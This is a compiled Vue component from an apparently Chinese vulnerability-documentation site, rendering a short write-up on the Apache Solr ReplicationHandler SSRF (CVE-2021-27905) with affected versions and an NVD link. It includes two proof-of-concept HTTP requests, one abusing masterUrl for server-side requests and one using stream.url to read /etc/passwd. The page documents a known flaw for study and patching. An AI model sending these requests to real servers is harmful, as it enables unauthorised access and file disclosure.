import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as i,c as l,a as e,b as a,d as s,e as d}from"./app-58e4a7d6.js";const c={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),h=e("p",null,"Apache Solr是一个开源搜索服务引擎，Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。漏洞产生在 ReplicationHandler 中的 masterUrl 参数（ leaderUrl 参数）可指派另一个 Solr 核心上的 ReplicationHandler 讲索引数据复制到本地核心上。成功利用此漏洞可造成服务端请求伪造漏洞。",-1),p=e("p",null,"参考链接：",-1),u={href:"https://nvd.nist.gov/vuln/detail/CVE-2021-27905",target:"_blank",rel:"noopener noreferrer"},m=d(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Solr 7.0.0 - 7.7.3 
Apache Solr 8.0.0 - 8.8.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h3><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /solr/test/replication?command=fetchindex&amp;masterUrl=http://127.0.0.1/&amp;wt=json&amp;httpBasicAuthUser=&amp;httpBasicAuthPassword= HTTP/1.1
HOST:target
....
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET http://xxxxx/solr/xxxx/debug/dump?stream.url=file:///etc/passwd&amp;param=ContentStream HTTP/1.1
HOST:target
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6);function v(x,_){const n=r("ExternalLinkIcon");return i(),l("div",null,[o,h,p,e("ul",null,[e("li",null,[e("a",u,[a("https://nvd.nist.gov/vuln/detail/CVE-2021-27905"),s(n)])])]),m])}const f=t(c,[["render",v],["__file","Apache Solr Replication handler SSRF CVE-2021-27905.html.vue"]]);export{f as default};
